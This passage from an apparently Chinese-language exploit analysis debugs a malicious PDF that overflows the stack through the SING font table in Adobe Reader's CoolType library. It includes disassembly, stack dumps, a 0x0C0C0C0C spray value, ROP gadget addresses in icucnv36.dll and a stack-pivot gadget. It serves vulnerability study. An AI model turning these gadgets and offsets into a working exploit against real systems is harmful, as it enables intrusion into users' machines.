    046BE7C0  41 41 41 41 41 41 41 41  AAAAAAAA
    046BE7C8  41 41 41 41 41 41 41 41  AAAAAAAA
    046BE7D0  41 41 41 41 41 41 41 41  AAAAAAAA
    046BE7D8  41 41 41 41 41 41 41 41  AAAAAAAA
    046BE7E0  41 41 41 41 6C           AAAAl
这里大量的A原本都是随机字符，由于刚才我们修改了exploit的代码因此使得这里的数据块更容易辨认。实际上这些数据都是样本中SING表里构造好的恶意数据。
    0803DD74    68 4CDB1908     push CoolType.0819DB4C   ; ASCII "SING"
    0803DD79    57               push edi
    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]
    0803DD7D    E8 843DFEFF     call CoolType.08021B06
    0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]
因此总结一下，以上的指令主要就是将SING表的tag名传入到08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。
继续往下动态调试，会发现关键的溢出点。
    0803DDA2    50              push eax
    0803DDA3    8D45 00         lea eax,dword ptr ss:[ebp]
    0803DDA6    50              push eax
    0803DDA7    C645 00 00      mov byte ptr ss:[ebp],0x0
    0803DDAB    E8 483D1300     call 
第一个pusheax 将刚刚获取到的SING表入口地址压入栈区。第二个
pusheax获取了当前栈区的ebp地址即要连接字符串的目的地址。我们单步过strcat之后，查看一下ebp开始的栈区数据。
    0012E4D8   41414141
    0012E4DC   41414141
    0012E4E0   4A82A714  icucnv36.4A82A714
    0012E4E4   0C0C0C0C
    0012E4E8   41414141
    0012E4EC   41414141
    0012E4F0   41414141
    0012E4F4   41414141
    0012E4F8   41414141
    0012E4FC   41414141
    0012E500   41414141
    0012E504   41414141
    0012E508   41414141
    0012E50C   41414141
    0012E510   41414141
    0012E514   41414141
    0012E518   41414141
    0012E51C   41414141
    0012E520   41414141
    0012E524   41414141
    0012E528   41414141
    0012E52C   41414141
    0012E530   41414141
    0012E534   41414141
    0012E538   41414141
    0012E53C   41414141
    0012E540   41414141
    0012E544   41414141
    0012E548   41414141
    0012E54C   41414141
    0012E550   41414141
    0012E554   41414141
    0012E558   41414141
    0012E55C   41414141
    0012E560   41414141
    0012E564   41414141
    0012E568   41414141
    0012E56C   41414141
    0012E570   41414141
    0012E574   41414141
    0012E578   41414141
    0012E57C   41414141
    0012E580   41414141
    0012E584   41414141
    0012E588   41414141
    0012E58C   41414141
    0012E590   41414141
    0012E594   41414141
    0012E598   41414141
    0012E59C   41414141
    0012E5A0   41414141
    0012E5A4   41414141
    0012E5A8   41414141
    0012E5AC   41414141
    0012E5B0   41414141
    0012E5B4   41414141
    0012E5B8   41414141
    0012E5BC   41414141
    0012E5C0   41414141
    0012E5C4   41414141
    0012E5C8   41414141
    0012E5CC   41414141
    0012E5D0   41414141
    0012E5D4   41414141
    0012E5D8   41414141
    0012E5DC   41414141
    0012E5E0   41414141
    0012E5E4   41414141
    0012E5E8   41414141
    0012E5EC   41414141
    0012E5F0   41414141
    0012E5F4   41414141
    0012E5F8   41414141
    0012E5FC   41414141
    0012E600   41414141
    0012E604   41414141
    0012E608   4A8A08C6  icucnv36.4A8A08C6
    0012E60C   41414141
    0012E610   41414141
    0012E614   41414141
    0012E618   41414141
    0012E61C   41414141
    0012E620   41414141
    0012E624   41414141
    0012E628   41414141
    0012E62C   41414141
    0012E630   41414141
    0012E634   41414141
    0012E638   41414141
    0012E63C   41414141
    0012E640   41414141
    0012E644   41414141
    0012E648   41414141
    0012E64C   41414141
    0012E650   41414141
    0012E654   41414141
    0012E658   41414141
    0012E65C   41414141
    0012E660   41414141
    0012E664   41414141
    0012E668   41414141
    0012E66C   41414141
    0012E670   41414141
    0012E674   41414141
    0012E678   41414141
    0012E67C   41414141
    0012E680   41414141
    0012E684   41414141
    0012E688   41414141
    0012E68C   41414141
    0012E690   41414141
    0012E694   41414141
    0012E698   41414141
    0012E69C   41414141
    0012E6A0   41414141
    0012E6A4   41414141
    0012E6A8   41414141
    0012E6AC   41414141
    0012E6B0   41414141
    0012E6B4   41414141
    0012E6B8   41414141
    0012E6BC   41414141
    0012E6C0   41414141
    0012E6C4   41414141
    0012E6C8   41414141
    0012E6CC   41414141
    0012E6D0   4A80CB38  返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C49
    0012E6D4   41414141
    0012E6D8   41414141
    0012E6DC   41414141
    0012E6E0   41414141
    0012E6E4   41414141
    0012E6E8   41414141
    0012E6EC   41414141
    0012E6F0   41414141
    0012E6F4   41414141
    0012E6F8   41414141
    0012E6FC   41414141
    0012E700   41414141
    0012E704   41414141
    0012E708   41414141
    0012E70C   41414141  指向下一个 SEH 记录的指针
    0012E710   41414141  SE处理程序
    0012E714   0000006C
此时栈溢出已经发生，栈区数据已经被修改成了SING表中构造的恶意数据(实际上是从uniqueName字段开始的数据)。
继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。
    0808B308    FF10            call dword ptr ds:[eax]
执行到0x0808B308时，我们发现了一个很有意思的地方。即调用了[eax]地址指向的函数。此时的eax =
0012E6D0，这正好处于我们刚才覆盖的栈区数据范围内。
且 [eax]= 0x4A80CB38。
    4A80CB38    81C5 94070000   add ebp,0x794
    4A80CB3E    C9              leave  (mov esp,ebp  pop ebp)
    4A80CB3F    C3              retn
首先调整了ebp。原本的ebp = 0x0012DD48 ebp+0x794 = 0x0012E4DC
重新将ebp调整进了覆盖的栈区数据范围内。接下来执行的leave，修改了esp，原本的esp = 0x0012DD24 esp = ebp =
0x0012E4DC [esp] = 0x41414141 并且弹栈之后
ebp = 0x41414141